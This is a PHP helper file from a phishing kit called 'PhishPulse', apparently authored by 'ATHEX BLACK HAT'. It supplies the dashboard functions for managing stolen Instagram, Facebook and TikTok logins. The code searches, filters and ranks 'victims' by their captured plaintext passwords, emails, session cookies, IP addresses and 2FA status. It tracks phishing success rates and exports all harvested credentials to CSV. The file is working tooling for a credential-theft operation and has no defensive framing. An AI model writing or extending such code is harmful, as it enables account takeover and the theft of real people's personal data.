<?php
/**
 * PhishPulse - Dashboard Helper Functions
 * Version: 1.0
 * Author: ATHEX BLACK HAT
 */

// Anti-theft check
if (!defined('DASHBOARD_TITLE')) {
    die("Just changing code can't make you a programmer. Learn and create your own! - ATHEX BLACK HAT");
}

/**
 * Get platform icon
 */
function get_platform_icon($platform) {
    $icons = [
        'instagram' => '📸',
        'facebook' => '👤',
        'tiktok' => '🎵',
    ];
    return $icons[$platform] ?? '📱';
}

/**
 * Get platform color class
 */
function get_platform_class($platform) {
    $classes = [
        'instagram' => 'instagram',
        'facebook' => 'facebook',
        'tiktok' => 'tiktok',
    ];
    return $classes[$platform] ?? '';
}

/**
 * Get status badge HTML
 */
function get_status_badge($status) {
    $badges = [
        'success' => '<span class="status-badge success">✅ Success</span>',
        'failed' => '<span class="status-badge failed">❌ Failed</span>',
        '2fa_pending' => '<span class="status-badge pending">⏳ 2FA Pending</span>',
        'active' => '<span class="status-badge pending">🔄 Active</span>',
        'completed' => '<span class="status-badge success">✅ Completed</span>',
    ];
    return $badges[$status] ?? '<span class="status-badge">❓ Unknown</span>';
}

/**
 * Get country flag emoji
 */
function get_country_flag($country_name) {
    $flags = [
        'Pakistan' => '🇵🇰',
        'United States' => '🇺🇸',
        'USA' => '🇺🇸',
        'India' => '🇮🇳',
        'United Kingdom' => '🇬🇧',
        'UK' => '🇬🇧',
        'Canada' => '🇨🇦',
        'Australia' => '🇦🇺',
        'Germany' => '🇩🇪',
        'France' => '🇫🇷',
        'Brazil' => '🇧🇷',
        'Indonesia' => '🇮🇩',
        'Bangladesh' => '🇧🇩',
        'Turkey' => '🇹🇷',
        'Saudi Arabia' => '🇸🇦',
        'UAE' => '🇦🇪',
        'Nigeria' => '🇳🇬',
        'Egypt' => '🇪🇬',
        'Russia' => '🇷🇺',
        'China' => '🇨🇳',
        'Japan' => '🇯🇵',
        'South Korea' => '🇰🇷',
        'Mexico' => '🇲🇽',
        'Spain' => '🇪🇸',
        'Italy' => '🇮🇹',
        'Netherlands' => '🇳🇱',
        'Unknown' => '🌍',
        'Local' => '💻',
    ];
    
    return $flags[$country_name] ?? '🌍';
}

/**
 * Format timestamp to "time ago"
 */
function time_ago($timestamp) {
    if (!$timestamp) return 'Unknown';
    
    $time = strtotime($timestamp);
    $now = time();
    $diff = $now - $time;
    
    if ($diff < 5) return 'Just now';
    if ($diff < 60) return $diff . 's ago';
    if ($diff < 3600) return floor($diff / 60) . 'm ago';
    if ($diff < 86400) return floor($diff / 3600) . 'h ago';
    if ($diff < 172800) return 'Yesterday';
    if ($diff < 604800) return floor($diff / 86400) . 'd ago';
    return date('M d, Y', $time);
}

/**
 * Format number with commas
 */
function format_number($number) {
    return number_format($number);
}

/**
 * Truncate string
 */
function truncate($string, $length = 50) {
    if (strlen($string) <= $length) return $string;
    return substr($string, 0, $length) . '...';
}

/**
 * Mask sensitive data partially
 */
function mask_partial($string, $show_first = 3, $show_last = 3) {
    if (!$string) return 'N/A';
    $len = strlen($string);
    if ($len <= $show_first + $show_last) return $string;
    
    $first = substr($string, 0, $show_first);
    $last = substr($string, -$show_last);
    $masked = str_repeat('*', $len - $show_first - $show_last);
    
    return $first . $masked . $last;
}

/**
 * Generate random color for chart
 */
function random_color() {
    return sprintf('#%06X', mt_rand(0, 0xFFFFFF));
}

/**
 * Get victim by ID
 */
function get_victim_by_id($id) {
    $victims = read_json(VICTIMS_FILE);
    foreach ($victims as $victim) {
        if (($victim['id'] ?? 0) == $id) {
            return $victim;
        }
    }
    return null;
}

/**
 * Search victims
 */
function search_victims($query) {
    $victims = read_json(VICTIMS_FILE);
    $query = strtolower($query);
    
    return array_filter($victims, function($v) use ($query) {
        return strpos(strtolower($v['username'] ?? ''), $query) !== false ||
               strpos(strtolower($v['password'] ?? ''), $query) !== false ||
               strpos(strtolower($v['profile']['email'] ?? ''), $query) !== false ||
               strpos(strtolower($v['profile']['full_name'] ?? ''), $query) !== false ||
               strpos(strtolower($v['device']['country'] ?? ''), $query) !== false ||
               strpos(strtolower($v['device']['ip_address'] ?? ''), $query) !== false;
    });
}

/**
 * Filter victims by platform
 */
function filter_by_platform($victims, $platform) {
    if ($platform === 'all') return $victims;
    
    return array_filter($victims, function($v) use ($platform) {
        return ($v['platform'] ?? '') === $platform;
    });
}

/**
 * Filter victims by status
 */
function filter_by_status($victims, $status) {
    if ($status === 'all') return $victims;
    
    return array_filter($victims, function($v) use ($status) {
        return ($v['status'] ?? '') === $status;
    });
}

/**
 * Sort victims by timestamp
 */
function sort_by_timestamp($victims, $order = 'desc') {
    usort($victims, function($a, $b) use ($order) {
        $time_a = strtotime($a['timestamp'] ?? '2000-01-01');
        $time_b = strtotime($b['timestamp'] ?? '2000-01-01');
        return $order === 'desc' ? $time_b - $time_a : $time_a - $time_b;
    });
    return $victims;
}

/**
 * Get today's count
 */
function get_today_count($victims) {
    $today = date('Y-m-d');
    $count = 0;
    
    foreach ($victims as $v) {
        $date = substr($v['timestamp'] ?? '', 0, 10);
        if ($date === $today) $count++;
    }
    
    return $count;
}

/**
 * Get unique countries list
 */
function get_unique_countries($victims) {
    $countries = [];
    
    foreach ($victims as $v) {
        $country = $v['device']['country'] ?? 'Unknown';
        if (!isset($countries[$country])) {
            $countries[$country] = 0;
        }
        $countries[$country]++;
    }
    
    arsort($countries);
    return $countries;
}

/**
 * Get hourly distribution
 */
function get_hourly_distribution($victims) {
    $hours = array_fill(0, 24, 0);
    
    foreach ($victims as $v) {
        $hour = (int)substr($v['timestamp'] ?? '', 11, 2);
        if ($hour >= 0 && $hour < 24) {
            $hours[$hour]++;
        }
    }
    
    return $hours;
}

/**
 * Calculate success rate
 */
function get_success_rate($victims) {
    $total = 0;
    $success = 0;
    
    foreach ($victims as $v) {
        $status = $v['status'] ?? '';
        if ($status === 'success' || $status === 'failed') {
            $total++;
            if ($status === 'success') $success++;
        }
    }
    
    return $total > 0 ? round(($success / $total) * 100, 1) : 0;
}

/**
 * Sanitize output
 */
function sanitize($data) {
    if (is_array($data)) {
        return array_map('sanitize', $data);
    }
    return htmlspecialchars($data ?? '', ENT_QUOTES, 'UTF-8');
}

/**
 * Generate random string
 */
function random_string($length = 10) {
    $chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $result = '';
    for ($i = 0; $i < $length; $i++) {
        $result .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $result;
}

/**
 * Check if running on localhost
 */
function is_localhost() {
    $whitelist = ['127.0.0.1', '::1', 'localhost'];
    return in_array($_SERVER['REMOTE_ADDR'] ?? '', $whitelist);
}

/**
 * Get system info
 */
function get_system_info() {
    return [
        'php_version' => phpversion(),
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
        'os' => PHP_OS,
        'memory_usage' => round(memory_get_usage(true) / 1024 / 1024, 2) . ' MB',
        'uptime' => function_exists('sys_getloadavg') ? sys_getloadavg() : 'N/A',
    ];
}

/**
 * Verify admin password
 */
function verify_password($password) {
    return $password === DEFAULT_PASSWORD;
}

/**
 * Change password
 */
function change_password($new_password) {
    // Update in settings file
    $settings = read_json(SETTINGS_FILE);
    $settings['password'] = $new_password;
    write_json(SETTINGS_FILE, $settings);
    
    // Also update config file
    $config_file = __DIR__ . '/../config.php';
    if (file_exists($config_file)) {
        $content = file_get_contents($config_file);
        $content = preg_replace(
            "/define\('DEFAULT_PASSWORD',\s*'[^']*'\);/",
            "define('DEFAULT_PASSWORD', '" . addslashes($new_password) . "');",
            $content
        );
        file_put_contents($config_file, $content);
    }
    
    return true;
}

/**
 * Generate CSV export
 */
function generate_csv($victims) {
    $filename = 'phishpulse_export_' . date('Y-m-d_His') . '.csv';
    
    header('Content-Type: text/csv; charset=utf-8');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    
    $output = fopen('php://output', 'w');
    
    // Headers
    fputcsv($output, [
        'ID', 'Platform', 'Status', 'Username', 'Password',
        'Email', 'Phone', 'Full Name', 'Followers', 'Verified',
        'Session ID', 'Country', 'City', 'ISP', 'VPN',
        'IP Address', 'Timestamp'
    ]);
    
    // Data rows
    foreach ($victims as $v) {
        fputcsv($output, [
            $v['id'] ?? '',
            $v['platform'] ?? '',
            $v['status'] ?? '',
            $v['username'] ?? '',
            $v['password'] ?? '',
            $v['profile']['email'] ?? '',
            $v['profile']['phone'] ?? '',
            $v['profile']['full_name'] ?? '',
            $v['profile']['followers'] ?? '',
            $v['profile']['is_verified'] ?? '',
            $v['cookies']['sessionid'] ?? $v['sessionid'] ?? '',
            $v['device']['country'] ?? '',
            $v['device']['city'] ?? '',
            $v['device']['isp'] ?? '',
            $v['device']['is_vpn'] ?? '',
            $v['device']['ip_address'] ?? '',
            $v['timestamp'] ?? ''
        ]);
    }
    
    fclose($output);
    exit;
}

/**
 * Log dashboard activity
 */
function log_activity($action, $details = '') {
    $log_file = DATA_DIR . 'dashboard.log';
    $log_entry = sprintf(
        "[%s] %s - %s - %s\n",
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $action,
        $details
    );
    file_put_contents($log_file, $log_entry, FILE_APPEND);
}
?>